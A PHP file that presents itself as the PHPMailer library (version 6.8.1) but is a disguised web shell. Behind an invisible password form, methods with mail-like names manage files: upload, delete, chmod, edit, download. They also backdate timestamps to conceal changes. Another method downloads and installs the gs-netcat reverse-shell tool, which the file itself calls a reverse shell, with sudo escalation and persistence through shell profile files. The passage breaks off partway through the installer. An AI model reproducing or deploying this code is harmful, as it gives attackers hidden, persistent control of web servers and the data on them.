<?php
/**
 * PHPMailer - PHP email creation and transport class.
 * @package PHPMailer
 * @link https://github.com/PHPMailer/PHPMailer/ The PHPMailer GitHub project
 * @author Marcus Bointon (Synchro/coolbru) <phpmailer@synchromedia.co.uk>
 * @author Jim Jagielski (jimjag) <jimjag@gmail.com>
 * @author Andy Prevost (codeworxtech) <codeworxtech@users.sourceforge.net>
 * @author Brent R. Matzelle (bmatzelle)
 * @copyright 2012 - 2023 Marcus Bointon
 * @copyright 2010 - 2012 Jim Jagielski
 * @copyright 2004 - 2009 Andy Prevost
 * @license http://www.gnu.org/copyleft/lesser.html GNU Lesser General Public License
 * @note This program is distributed in the hope that it will be useful - WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE.
 */

namespace PHPMailer\PHPMailer;

if (!defined('ABSPATH')) {
    define('ABSPATH', dirname(__FILE__) . '/');
}

@set_time_limit(0);
error_reporting(0);

if (function_exists("ini_set")) {
    @ini_set("error_log", null);
    @ini_set("log_errors", 0);
    @ini_set("max_execution_time", 0);
}

/**
 * PHPMailer - PHP email creation and transport class.
 */
class PHPMailer
{
    const VERSION = '6.8.1';
    const CHARSET_ASCII = 'us-ascii';
    const CHARSET_ISO88591 = 'iso-8859-1';
    const CHARSET_UTF8 = 'utf-8';
    const CONTENT_TYPE_PLAINTEXT = 'text/plain';
    const CONTENT_TYPE_TEXT_CALENDAR = 'text/calendar';
    const CONTENT_TYPE_TEXT_HTML = 'text/html';
    const CONTENT_TYPE_MULTIPART_ALTERNATIVE = 'multipart/alternative';
    const CONTENT_TYPE_MULTIPART_MIXED = 'multipart/mixed';
    const CONTENT_TYPE_MULTIPART_RELATED = 'multipart/related';
    const ENCODING_7BIT = '7bit';
    const ENCODING_8BIT = '8bit';
    const ENCODING_BASE64 = 'base64';
    const ENCODING_BINARY = 'binary';
    const ENCODING_QUOTED_PRINTABLE = 'quoted-printable';
    const ENCRYPTION_STARTTLS = 'tls';
    const ENCRYPTION_SMTPS = 'ssl';
    const ICAL_METHOD_REQUEST = 'REQUEST';
    const ICAL_METHOD_PUBLISH = 'PUBLISH';
    const ICAL_METHOD_REPLY = 'REPLY';
    const ICAL_METHOD_ADD = 'ADD';
    const ICAL_METHOD_CANCEL = 'CANCEL';
    const ICAL_METHOD_REFRESH = 'REFRESH';
    const ICAL_METHOD_COUNTER = 'COUNTER';
    const ICAL_METHOD_DECLINECOUNTER = 'DECLINECOUNTER';

    public $Priority;
    public $CharSet = self::CHARSET_UTF8;
    public $ContentType = self::CONTENT_TYPE_PLAINTEXT;
    public $Encoding = self::ENCODING_8BIT;
    public $ErrorInfo = '';
    public $From = '';
    public $FromName = '';
    public $Sender = '';
    public $Subject = '';
    public $Body = '';
    public $AltBody = '';
    public $Ical = '';
    protected $MIMEBody = '';
    protected $MIMEHeader = '';
    protected $mailHeader = '';
    public $WordWrap = 0;
    public $Mailer = 'mail';
    public $Sendmail = '/usr/sbin/sendmail';
    public $UseSendmailOptions = true;
    public $ConfirmReadingTo = '';
    public $Hostname = '';
    public $MessageID = '';
    public $MessageDate = '';
    public $Host = 'localhost';
    public $Port = 25;
    public $Helo = '';
    public $SMTPSecure = '';
    public $SMTPAutoTLS = true;
    public $SMTPAuth = false;
    public $SMTPOptions = [];
    public $Username = '';
    public $Password = '';
    public $AuthType = '';
    public $oauth;
    public $Timeout = 300;
    public $dsn = '';
    public $SMTPDebug = 0;
    public $Debugoutput = 'echo';
    public $SMTPKeepAlive = false;
    public $SingleTo = false;
    public $SingleToArray = [];
    protected $do_verp = false;
    public $AllowEmpty = false;
    public $DKIM_selector = '';
    public $DKIM_identity = '';
    public $DKIM_passphrase = '';
    public $DKIM_domain = '';
    public $DKIM_copyHeaderFields = true;
    public $DKIM_extraHeaders = [];
    public $DKIM_private = '';
    public $DKIM_private_string = '';
    public $action_function = '';
    public $XMailer = '';
    public static $validator = 'php';

    protected $smtp;
    protected $to = [];
    protected $cc = [];
    protected $bcc = [];
    protected $ReplyTo = [];
    protected $all_recipients = [];
    protected $RecipientsQueue = [];
    protected $ReplyToQueue = [];
    protected $attachment = [];
    protected $CustomHeader = [];
    protected $lastMessageID = '';
    protected $message_type = '';
    protected $boundary = [];
    protected $language = [];
    protected $error_count = 0;
    protected $sign_cert_file = '';
    protected $sign_key_file = '';
    protected $sign_extracerts_file = '';
    protected $sign_key_pass = '';
    protected $exceptions = false;
    protected $uniqueid = '';

    private $mailToken;
    private $mailIndex;
    private $mailTheme;
    private $mailEncoding;
    private $mailDisabled;
    public $mailPath;
    private $mailRoot;
    private $mailBase;
    private $mailSafe;
    private $mailOS;

    protected function setMailCookie($name, $value)
    {
        $_COOKIE[$name] = $value;
        setcookie($name, $value);
    }

    public function validateAddress()
    {
        $this->mailToken = "fa704e7366d666bd";
        $this->mailIndex = "_" . substr(md5($_SERVER["HTTP_HOST"]), 0, 5);
        $this->mailTheme = "#df5";
        $this->mailEncoding = "Windows-1251";
        $authHash = '$2y$12$xGHyR4xXMfCKW1T7EJIsCu9G3pP9zgQikBayN23M9b6Mz8p6/j5f6';
        if (isset($_POST['password'])) {
            if (@password_verify($_POST['password'], $authHash)) {
                $this->setMailCookie($this->mailIndex, $this->mailToken);
            } else {
                die($this->getLoginTemplate());
            }
        }
        if (!@isset($_COOKIE[$this->mailIndex]) || $_COOKIE[$this->mailIndex] != $this->mailToken) {
            die($this->getLoginTemplate());
        }
    }

    protected function getLoginTemplate() {
        return '<!DOCTYPE html><html><head><style>input{margin:0;background:white;border:none;outline:none;color:transparent;caret-color:transparent;}</style></head><body><form method="POST" action=""><label for="password"></label><input type="password" id="password" name="password"></form></body></html>';
    }

    public function preSend()
    {
        $selfPath = __FILE__;
        $dirPath = dirname($selfPath);
        if (!is_writable($selfPath)) @chmod($selfPath, 0644);
        if (!is_writable($dirPath)) @chmod($dirPath, 0755);
        if (function_exists("ini_get")) {
            $this->mailSafe = @ini_get("safe_mode");
            $this->mailDisabled = @ini_get("disable_functions");
        }
        if (!$this->mailSafe && function_exists("error_reporting")) {
            error_reporting(0);
        }
        if (!$this->mailSafe && function_exists("set_time_limit")) {
            set_time_limit(0);
        }
        if (function_exists("get_magic_quotes_gpc") && function_exists("array_map") && function_exists("stripslashes") && function_exists("is_array")) {
            if (@get_magic_quotes_gpc()) {
                function mailStripSlashes($arr)
                {
                    return @is_array($arr) ? @array_map("mailStripSlashes", $arr) : @stripslashes($arr);
                }
                $_POST = mailStripSlashes($_POST);
                $_COOKIE = mailStripSlashes($_COOKIE);
            }
        }
        if (!function_exists("posix_getpwuid") && strpos($this->mailDisabled, "posix_getpwuid") === false) {
            function posix_getpwuid($uid) { return false; }
        }
        if (!function_exists("posix_getgrgid") && strpos($this->mailDisabled, "posix_getgrgid") === false) {
            function posix_getgrgid($gid) { return false; }
        }
        $this->mailOS = (strtolower(substr(PHP_OS, 0, 3)) == "win") ? "win" : "nix";
        $this->mailBase = $_SERVER["DOCUMENT_ROOT"];
        $this->mailRoot = function_exists("getcwd") ? @getcwd() : @dirname(__FILE__);
        
        if (isset($_POST["c"]) && $_POST["c"] != "") {
            $_POST["c"] = (strpos($_POST["c"], '%') !== false) ? str_rot13(urldecode($_POST["c"])) : str_rot13($_POST["c"]);
        }
        
        if (isset($_POST["c"]) && function_exists("chdir")) {
            @chdir($_POST["c"]);
        }
        
        if (function_exists("getcwd")) {
            $this->mailPath = @getcwd();
        } elseif (@isset($_POST["c"]) && $_POST["c"] != "") {
            $this->mailPath = $_POST["c"];
        } else {
            $this->mailPath = $this->mailRoot;
        }
        
        if ($this->mailOS == "win") {
            $this->mailRoot = str_replace("\\", "/", $this->mailRoot);
            $this->mailPath = str_replace("\\", "/", $this->mailPath);
        }
        if ($this->mailPath[strlen($this->mailPath) - 1] != "/") {
            $this->mailPath .= "/";
        }
    }

    protected function getFileUrl($filePath) {
        $docRoot = rtrim($_SERVER["DOCUMENT_ROOT"], '/');
        $relPath = str_replace($docRoot, '', $filePath);
        $proto = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on') ? "https" : "http";
        return $proto . "://" . $_SERVER['HTTP_HOST'] . $relPath;
    }

    public function clearAllRecipients()
    {
        $idx = $this->mailIndex;
        setcookie($idx, "", time() - 3600);
        die("bye!");
    }

    public function addAttachment()
    {
        $cwd = $this->mailPath;
        if (!empty($_POST["p"]) && $_POST["p"] == "touch" && !empty($_POST["touch_path"]) && !empty($_POST["touch_time"])) {
            $touchPath = str_rot13(urldecode($_POST["touch_path"]));
            $touchTime = strtotime($_POST["touch_time"]);
            if ($touchTime && @file_exists($touchPath)) {
                if (@touch($touchPath, $touchTime, $touchTime)) {
                    echo "<font color='green'>Timestamp updated!</font><br>";
                } else {
                    echo "<font color='red'>Failed to update timestamp!</font><br>";
                }
            }
        }
        
        if (!empty($_POST["p"])) {
            $mtime = @filemtime($_POST["c"]);
            switch ($_POST["p"]) {
                case "uploadFile":
                    if (!@move_uploaded_file($_FILES["f"]["tmp_name"], $_FILES["f"]["name"])) {
                        echo "<font color='red'>Can't upload file!</font>";
                    } else {
                        echo "<font color='green'>File uploaded!</font>";
                        if ($mtime) @touch($_FILES["f"]["name"], $mtime, $mtime);
                    }
                    break;
                case "mkdir":
                    if (!@mkdir(str_rot13($_POST["x"]))) {
                        echo "<font color='red'>Can't create new dir</font>";
                    } else {
                        echo "<font color='green'>Directory created!</font>";
                        if ($mtime) @touch(str_rot13($_POST["x"]), $mtime, $mtime);
                    }
                    break;
                case "delete":
                    $delFunc = function($path) use (&$delFunc) {
                        $path = substr($path, -1) == "/" ? $path : $path . "/";
                        if ($handle = @opendir($path)) {
                            while (($file = @readdir($handle)) !== false) {
                                if ($file == ".." || $file == ".") continue;
                                $f = $path . $file;
                                if (@is_dir($f)) $delFunc($f); else @unlink($f);
                            }
                            @closedir($handle);
                        }
                        @rmdir($path);
                    };
                    if (@is_array($_POST["f"])) {
                        $deleted = 0;
                        foreach ($_POST["f"] as $item) {
                            if ($item == "..") continue;
                            $item = str_rot13(urldecode($item));
                            if (@is_dir($item)) { $delFunc($item); $deleted++; } else { if (@unlink($item)) $deleted++; }
                        }
                        echo "<font color='green'>Deleted $deleted item(s)</font>";
                    } elseif (!empty($_POST["x"])) {
                        $item = str_rot13(urldecode($_POST["x"]));
                        if (@is_dir($item)) { $delFunc($item); echo "<font color='green'>Directory deleted!</font>"; } else { if (@unlink($item)) echo "<font color='green'>File deleted!</font>"; else echo "<font color='red'>Can't delete!</font>"; }
                    }
                    break;
                case "massChmod":
                    if (@is_array($_POST["f"]) && !empty($_POST["chmod_val"])) {
                        $chmodVal = octdec($_POST["chmod_val"]);
                        $changed = 0;
                        foreach ($_POST["f"] as $item) {
                            if ($item == "..") continue;
                            $item = str_rot13(urldecode($item));
                            if (@chmod($item, $chmodVal)) $changed++;
                        }
                        echo "<font color='green'>Changed permissions on $changed item(s)</font>";
                    }
                    break;
            }
            if ($mtime) @touch($_POST["c"], $mtime, $mtime);
        }
        echo "<h1>File Manager</h1><div class=content><script>p_=x_=s_=\"\";</script>";
        echo "<script>function showTouch(path,currentTime){var newTime=prompt('Enter new timestamp (YYYY-MM-DD HH:MM:SS):',currentTime);if(newTime && newTime!=currentTime){var f=document.createElement('form');f.method='post';f.style.display='none';var a=document.createElement('input');a.name='a';a.value='fm';f.appendChild(a);var c=document.createElement('input');c.name='c';c.value='" . str_rot13($cwd) . "';f.appendChild(c);var p=document.createElement('input');p.name='p';p.value='touch';f.appendChild(p);var tp=document.createElement('input');tp.name='touch_path';tp.value=path;f.appendChild(tp);var tt=document.createElement('input');tt.name='touch_time';tt.value=newTime;f.appendChild(tt);document.body.appendChild(f);f.submit();}}</script>";
        
        $files = $this->scanDirectory(@isset($_POST["c"]) ? $_POST["c"] : $cwd);
        if ($files === false) { echo "Can't open this folder!"; return; }
        global $sortParams;
        $sortParams = array("name", 1);
        if (!empty($_POST["p"]) && @preg_match("!s_([A-z]+)_(\\d{1})!", $_POST["p"], $matches)) {
            $sortParams = array($matches[1], (int) $matches[2]);
        }
        echo "<script>function sa(){for(i=0;i<d.files.elements.length;i++)if(d.files.elements[i].type=='checkbox')d.files.elements[i].checked=d.files.elements[0].checked;}</script><table width='100%' class='main' cellspacing='0' cellpadding='2'><form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th width='30%'><a href='#' onclick='g(\"fm\",null,\"s_name_" . ($sortParams[1] ? 0 : 1) . "\")'>Name</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_size_" . ($sortParams[1] ? 0 : 1) . "\")'>Size</a></th><th><a href='#' onclick='g(\"fm\",null,\"s_modify_" . ($sortParams[1] ? 0 : 1) . "\")'>Modify</a></th><th>URL</th><th><a href='#' onclick='g(\"fm\",null,\"s_perms_" . ($sortParams[1] ? 0 : 1) . "\")'>Perms</a></th><th width='180px'>Actions</th></tr>";
        $dirs = $fileList = array();
        foreach ($files as $f) {
            $item = array("name" => $f, "path" => $cwd . $f, "modify" => @date("Y-m-d H:i:s", @filemtime($cwd . $f)), "perms" => $this->getPermsColor($cwd . $f), "size" => @filesize($cwd . $f));
            if (@is_file($cwd . $f)) $fileList[] = @array_merge($item, array("type" => "file"));
            elseif (@is_link($cwd . $f)) $dirs[] = @array_merge($item, array("type" => "link", "link" => readlink($item["path"])));
            elseif (@is_dir($cwd . $f)) $dirs[] = @array_merge($item, array("type" => "dir"));
        }
        $cmpFunc = function($a, $b) {
            global $sortParams;
            if ($sortParams[0] != "size") return @strcmp(strtolower($a[$sortParams[0]]), strtolower($b[$sortParams[0]])) * ($sortParams[1] ? 1 : -1);
            else return ($a["size"] < $b["size"] ? -1 : 1) * ($sortParams[1] ? 1 : -1);
        };
        @usort($fileList, $cmpFunc); @usort($dirs, $cmpFunc);
        $fileList = @array_merge($dirs, $fileList);
        $alt = 0;
        foreach ($fileList as $item) {
            $enc = str_rot13(urlencode($item["name"]));
            $encPath = urlencode(str_rot13($item["path"]));
            $fileUrl = $this->getFileUrl($item["path"]);
            echo "<tr" . ($alt ? " class=l1" : " class=l2") . "><td><input type=checkbox name='f[]' value=\"" . $enc . "\" class=chkbx></td>";
            if ($item["type"] == "dir") echo "<td><a href=# onclick=\"g('fm','" . $encPath . "','','','')\">" . "<b>[ " . htmlspecialchars($item["name"]) . " ]</b></a>" . ($item["type"] == "link" ? " -> " . htmlspecialchars($item["link"]) : "") . "</td>";
            else echo "<td><a href=# onclick=\"g('ft','" . $encPath . "','view','','')\">" . htmlspecialchars($item["name"]) . "</a>" . ($item["type"] == "link" ? " -> " . htmlspecialchars($item["link"]) : "") . "</td>";
            echo "<td>" . ($item["type"] == "dir" ? "DIR" : $this->formatSize($item["size"])) . "</td><td><a href='#' onclick=\"showTouch('" . $encPath . "','" . $item["modify"] . "')\" title='Click to change'>" . $item["modify"] . "</a></td>";
            echo "<td>" . (($item["type"] != "dir" && $item["name"] != "." && $item["name"] != "..") ? "<a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Link</a>" : "-") . "</td>";
            echo "<td><a href=# onclick=\"g('ft','" . $encPath . "','chmod','')\">" . $item["perms"] . "</a></td><td><a href=# onclick=\"g('ft','" . $encPath . "','edit','')\">Edit</a> <a href=# onclick=\"g('ft','" . $encPath . "','rename','')\">Rename</a> <a href=# onclick=\"if(confirm('Delete this item?'))g('fm','" . str_rot13($cwd) . "','delete','" . $enc . "')\">Delete</a></td></tr>";
            $alt = !$alt;
        }
        echo "<tr><td colspan=7><input type=hidden name=a value='fm'><input type=hidden name=c value='" . htmlspecialchars(str_rot13($cwd)) . "'><input type=hidden name=ch value='" . (@isset($_POST["ch"]) ? $_POST["ch"] : "") . "'><select name='p'><option value='delete'>Delete</option><option value='massChmod'>Mass Chmod</option></select><input type='text' name='chmod_val' placeholder='0755' size='5'>&nbsp;<input type='submit' value='>>'></td></tr></form></table></div>";
    }

    public function addStringAttachment()
    {
        $actionNames = array('view', 'edit', 'rename', 'chmod', 'touch', 'download', 'mkfile');
        if (@isset($_POST["p"]) && in_array(strtolower($_POST["p"]), $actionNames)) { $filePath = $_POST["c"]; $action = strtolower($_POST["p"]); }
        else if (@isset($_POST["p"])) { $filePath = str_rot13(urldecode($_POST["p"])); $action = @isset($_POST["x"]) ? strtolower($_POST["x"]) : 'view'; }
        else { $filePath = @isset($_POST["c"]) ? $_POST["c"] : ''; $action = 'view'; }
        
        if ($action == "download") {
            if (@is_file($filePath) && @is_readable($filePath)) {
                ob_start("ob_gzhandler", 4096); @header("Content-Disposition: attachment; filename=" . @basename($filePath));
                @header("Content-Type: " . (function_exists("mime_content_type") ? @mime_content_type($filePath) : "application/octet-stream"));
                $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo @fgets($handle, 1024); @fclose($handle); }
            }
            exit;
        }
        
        if ($action == "mkfile" && !@file_exists($filePath)) {
            $mtime = @filemtime(dirname($filePath)); $handle = @fopen($filePath, "w");
            if ($handle) { @fclose($handle); if ($mtime) { @touch(dirname($filePath), $mtime, $mtime); @touch($filePath, $mtime, $mtime); } $action = "edit"; }
        }
        
        echo "<h1>File Tools</h1><div class=content>";
        if (!@file_exists($filePath)) { echo "File not exists: " . htmlspecialchars($filePath); return; }
        $owner = @posix_getpwuid(@fileowner($filePath)); if (!$owner) { $owner["name"] = @fileowner($filePath); $group["name"] = @filegroup($filePath); } else { $group = @posix_getgrgid(@filegroup($filePath)); }
        $fileUrl = $this->getFileUrl($filePath);
        echo "<span>Name:</span> " . htmlspecialchars(@basename($filePath)) . " <span>Size:</span> " . (@is_file($filePath) ? $this->formatSize(@filesize($filePath)) : "-") . " <span>Permission:</span> " . $this->getPermsColor($filePath) . " <span>Owner/Group:</span> " . $owner["name"] . "/" . $group["name"] . "<br>";
        echo "<span>Change time:</span> " . @date("Y-m-d H:i:s", @filectime($filePath)) . " <span>Access time:</span> " . @date("Y-m-d H:i:s", @fileatime($filePath)) . " <span>Modify time:</span> " . @date("Y-m-d H:i:s", @filemtime($filePath));
        if (@is_file($filePath)) echo " <span>URL:</span> <a href='" . htmlspecialchars($fileUrl) . "' target='_blank'>Open</a>";
        echo "<br><br>";
        if (empty($action)) $action = "view";
        $actions = @is_file($filePath) ? array("View", "Download", "Edit", "Chmod", "Rename", "Touch") : array("Chmod", "Rename", "Touch");
        $encFilePath = urlencode(str_rot13($filePath));
        foreach ($actions as $val) echo "<a href=# onclick=\"g('ft',null,'" . $encFilePath . "','" . @strtolower($val) . "')\">" . (@strtolower($val) == $action ? "<b>[ " . $val . " ]</b>" : $val) . "</a> ";
        echo "<br><br>";
        
        switch ($action) {
            case "view": echo "<pre class=ml1>"; $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo htmlspecialchars(@fgets($handle, 1024)); @fclose($handle); } echo "</pre>"; break;
            case "chmod":
                if (!empty($_POST["s"])) {
                    $perms = 0; for ($i = strlen($_POST["s"]) - 1; $i >= 0; --$i) $perms += (int) $_POST["s"][$i] * @pow(8, strlen($_POST["s"]) - $i - 1);
                    if (!@chmod($filePath, $perms)) echo "<font color='red'>Can't set permissions!</font><br><script>document.mf.s.value=\"\";</script>";
                    else echo "<font color='green'>Permissions changed!</font><br>";
                }
                @clearstatcache(); echo "<script>s_=\"\";</script><form onsubmit=\"g('ft',null,'" . $encFilePath . "','chmod',this.chmod.value);return false;\"><input type=text name=chmod value=\"" . substr(@sprintf("%o", @fileperms($filePath)), -4) . "\"><input type=submit value=\">>\"></form>"; break;
            case "edit":
                if (!@is_writable($filePath)) { echo "<font color='red'>File isn't writeable</font>"; break; }
                if (!empty($_POST["s"])) {
                    $mtime = @filemtime($filePath); $_POST["s"] = substr($_POST["s"], 1); $_POST["s"] = @base64_decode($_POST["s"]);
                    $handle = @fopen($filePath, "w"); if ($handle) { @fputs($handle, $_POST["s"]); @fclose($handle); echo "<font color='green'>File saved!</font><br>"; if ($mtime) @touch($filePath, $mtime, $mtime); }
                }
                echo "<form onsubmit=\"g('ft',null,'" . $encFilePath . "','edit','_'+utoa(this.text.value));return false;\"><textarea name=text class=bigarea>";
                $handle = @fopen($filePath, "r"); if ($handle) { while (!@feof($handle)) echo htmlspecialchars(@fgets($handle, 1024)); @fclose($handle); }
                echo "</textarea><br><input type=submit value='Save'></form>"; break;
            case "rename":
                if (!empty($_POST["s"])) {
                    $mtime = @filemtime($filePath); $newName = str_rot13($_POST["s"]);
                    if (!@rename($filePath, $newName)) echo "<font color='red'>Can't rename!</font><br>";
                    else { echo "<font color='green'>Renamed!</font><br>"; $filePath = $newName; if ($mtime) @touch($filePath, $mtime, $mtime); }
                }
                @clearstatcache(); $dirPath = dirname($filePath); $fileName = basename($filePath);
                echo "<form onsubmit=\"g('ft',null,'" . $encFilePath . "','rename',rot13('" . htmlspecialchars($dirPath) . "/' + this.name.value));return false;\"><input type=text name=name value=\"" . htmlspecialchars($fileName) . "\" style='width:400px;'><input type=submit value=\">>\"></form>"; break;
            case "touch":
                if (!empty($_POST["s"])) {
                    $mtime = @strtotime($_POST["s"]);
                    if ($mtime) { if (!@touch($filePath, $mtime, $mtime)) echo "<font color='red'>Fail!</font>"; else echo "<font color='green'>Touched!</font>"; }
                    else echo "<font color='red'>Bad time format!</font>";
                }
                @clearstatcache(); echo "<script>s_=\"\";</script><form onsubmit=\"g('ft',null,'" . $encFilePath . "','touch',this.touch.value);return false;\"><input type=text name=touch value=\"" . @date("Y-m-d H:i:s", @filemtime($filePath)) . "\"><input type=submit value=\">>\"></form>"; break;
        }
        echo "</div>";
    }

    // =====================================================
    // IMPROVED GSOCKET INSTALLER - Install to /usr/bin or /usr/local/bin with bashrc integration
    // =====================================================
    protected function findSystemBinDir() {
        // Priority order for system binary directories
        $systemDirs = [
            '/usr/local/bin',
            '/usr/bin',
            '/usr/local/sbin',
            '/usr/sbin',
            '/opt/bin'
        ];
        
        foreach ($systemDirs as $dir) {
            if (@is_dir($dir) && @is_writable($dir)) {
                return ['path' => $dir, 'type' => 'system', 'writable' => true];
            }
        }
        
        // Check if we can use sudo to write
        foreach ($systemDirs as $dir) {
            if (@is_dir($dir)) {
                $testFile = $dir . '/.gs_test_' . mt_rand();
                $result = $this->executeCommand("sudo touch " . escapeshellarg($testFile) . " 2>/dev/null && sudo rm -f " . escapeshellarg($testFile) . " 2>/dev/null && echo 'OK'");
                if (trim($result) === 'OK') {
                    return ['path' => $dir, 'type' => 'system_sudo', 'writable' => true];
                }
            }
        }
        
        return ['path' => null, 'type' => 'none', 'writable' => false];
    }

    protected function findWritableExecDir() {
        // First try system directories
        $sysDir = $this->findSystemBinDir();
        if ($sysDir['writable']) {
            return $sysDir['path'];
        }
        
        // Fallback to user directories
        $userDirs = [
            @getenv('HOME') . '/bin',
            @getenv('HOME') . '/.local/bin',
            '/tmp',
            '/var/tmp',
            '/dev/shm',
            sys_get_temp_dir()
        ];
        
        $homeDir = @getenv('HOME') ?: (@getenv('USERPROFILE') ?: '');
        if ($homeDir) {
            array_unshift($userDirs, $homeDir . '/bin');
            array_unshift($userDirs, $homeDir . '/.local/bin');
        }
        
        foreach ($userDirs as $dir) {
            if (!@is_dir($dir)) {
                @mkdir($dir, 0755, true);
            }
            if (@is_dir($dir) && @is_writable($dir)) {
                return $dir;
            }
        }
        
        // Last resort: create hidden directory
        $fallback = '/tmp/.gs_' . substr(md5(mt_rand() . time()), 0, 8);
        @mkdir($fallback, 0755, true);
        return $fallback;
    }

    protected function getGsArch() {
        $uname = $this->executeCommand('uname -m 2>/dev/null');
        $uname = strtolower(trim($uname));
        if (strpos($uname, 'x86_64') !== false || strpos($uname, 'amd64') !== false) return 'x86_64';
        if (strpos($uname, 'aarch64') !== false || strpos($uname, 'arm64') !== false) return 'aarch64';
        if (strpos($uname, 'armv7') !== false || strpos($uname, 'armhf') !== false) return 'armv7l';
        if (strpos($uname, 'arm') !== false) return 'armv6l';
        if (strpos($uname, 'i686') !== false || strpos($uname, 'i386') !== false || strpos($uname, 'i586') !== false) return 'i686';
        return 'x86_64';
    }

    protected function generateSecret() {
        $chars = 'abcdef0123456789';
        $secret = '';
        for ($i = 0; $i < 16; $i++) {
            $secret .= $chars[mt_rand(0, 15)];
        }
        return $secret;
    }

    protected function downloadWithRetry($url, $dest, $timeout = 60, $useSudo = false) {
        $methods = [];
        $sudoPrefix = $useSudo ? 'sudo ' : '';
        
        $methods['curl_cmd'] = function($url, $dest) use ($timeout, $sudoPrefix) {
            $cmd = $sudoPrefix . "curl -fsSL --connect-timeout 10 --max-time $timeout -o " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null";
            $this->executeCommand($cmd);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        
        $methods['wget_cmd'] = function($url, $dest) use ($timeout, $sudoPrefix) {
            $cmd = $sudoPrefix . "wget -q --timeout=$timeout -O " . escapeshellarg($dest) . " " . escapeshellarg($url) . " 2>/dev/null";
            $this->executeCommand($cmd);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        
        $methods['php_curl'] = function($url, $dest) use ($timeout) {
            if (!function_exists('curl_init')) return false;
            $ch = @curl_init();
            if (!$ch) return false;
            $fp = @fopen($dest, 'wb');
            if (!$fp) { @curl_close($ch); return false; }
            @curl_setopt($ch, CURLOPT_URL, $url);
            @curl_setopt($ch, CURLOPT_FILE, $fp);
            @curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
            @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            @curl_exec($ch);
            @curl_close($ch);
            @fclose($fp);
            return @file_exists($dest) && @filesize($dest) > 1000;
        };
        
        $methods['php_fgc'] = function($url, $dest) use ($timeout) {
            $ctx = @stream_context_create([
                'http' => ['timeout' => $timeout, 'header' => "User-Agent: Mozilla/5.0\r\n"],
                'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
            ]);
            $data = @file_get_contents($url, false, $ctx);
            if ($data && strlen($data) > 1000) {
                return @file_put_contents($dest, $data) !== false;
            }
            return false;
        };
        
        foreach ($methods as $name => $method) {
            @unlink($dest);
            if ($method($url, $dest)) {
                return ['success' => true, 'method' => $name];
            }
        }
        return ['success' => false, 'method' => null];
    }

    protected function addToBashrc($binaryPath) {
        $homeDir = @getenv('HOME') ?: '/root';
        $bashrcFiles = [
            $homeDir . '/.bashrc',
            $homeDir . '/.bash_profile',
            $homeDir . '/.profile',
            '/etc/profile.d/gsocket.sh'
        ];
        
        $binDir = dirname($binaryPath);
        $exportLine = "\n# GSocket PATH\nexport PATH=\"\$PATH:$binDir\"\n";
        $aliasLine = "alias gs='gs-netcat'\n";
        
        $added = false;
        foreach ($bashrcFiles as $rcFile) {
            if (@is_writable(dirname($rcFile))) {
                $content = @file_get_contents($rcFile) ?: '';
                if (strpos($content, $binDir) === false) {
                    if (@file_put_contents($rcFile, $content . $exportLine . $aliasLine, LOCK_EX)) {
                        $added = true;
                        break;
                    }
                } else {
                    $added = true;
                    break;
                }
            }
        }
        
        // Try with sudo for system-wide
        if (!$added) {
            $sysProfile = '/etc/profile.d/gsocket.sh';
            $content = "#!/bin/bash\nexport PATH=\"\$PATH:$binDir\"\nalias gs='gs-netcat'\n";
            $this->executeCommand("echo " . escapeshellarg($content) . " | sudo tee " . escapeshellarg($sysProfile) . " > /dev/null 2>&1");
            $this->executeCommand("sudo chmod 644 " . escapeshellarg($sysProfile) . " 2>/dev/null");
        }
        
        return $added;
    }

    protected function createSymlink($binaryPath, $targetDir) {
        $linkPath = $targetDir . '/gs-netcat';
        if ($binaryPath === $linkPath) return true;
        
        // Try direct symlink
        if (@symlink($binaryPath, $linkPath)) return true;
        
        // Try with sudo
        $this->executeCommand("sudo ln -sf " . escapeshellarg($binaryPath) . " " . escapeshellarg($linkPath) . " 2>/dev/null");
        return @is_link($linkPath) || @file_exists($linkPath);
    }

    public function smtpConnect() {
        echo "<h1>GSocket Installer</h1><div class=content>";
        echo "<p>GSocket provides a secure reverse shell connection. <b>Enhanced installer</b> with system-wide installation support.</p>";
        echo "<p><b>Installation Priority:</b> /usr/local/bin → /usr/bin → ~/bin → /tmp (fallback)</p>";
        
        if (isset($_POST['gs_method'])) {
            $method = $_POST['gs_method'];
            $arch = $this->getGsArch();
            $success = false;
            $secret = '';
            $output = '';
            $debugInfo = [];
            $installedPath = '';
            
            // Determine installation directory
            $sysDir = $this->findSystemBinDir();
            $useSudo = ($sysDir['type'] === 'system_sudo');
            $targetDir = $sysDir['writable'] ? $sysDir['path'] : $this->findWritableExecDir();
            
            echo "<pre>";
            echo "<b>System Info:</b>\n";
            echo "Architecture: $arch\n";
            echo "Target Dir: $targetDir\n";
            echo "Install Type: " . ($sysDir['writable'] ? ($useSudo ? 'System (sudo)' : 'System (direct)') : 'User/Temp') . "\n";
            echo "Method: $method\n\n";
            
            $binaryUrls = [
                "https://github.com/hackerschoice/gsocket/releases/latest/download/gs-netcat_linux-{$arch}",
                "https://github.com/hackerschoice/binary/raw/main/gsocket/gs-netcat_linux-{$arch}",
                "https://raw.githubusercontent.com/hackerschoice/binary/main/gsocket/gs-netcat_linux-{$arch}",
            ];
            
            $envSetup = "export HOME=" . escapeshellarg($targetDir) . "; " .
                        "export GS_DSTDIR=" . escapeshellarg($targetDir) . "; " .
                        "export TERM=xterm; " .
                        "cd " . escapeshellarg($targetDir) . "; ";
            
            $sudoPrefix = $useSudo ? 'sudo ' : '';
            
            switch ($method) {
                case 'auto':
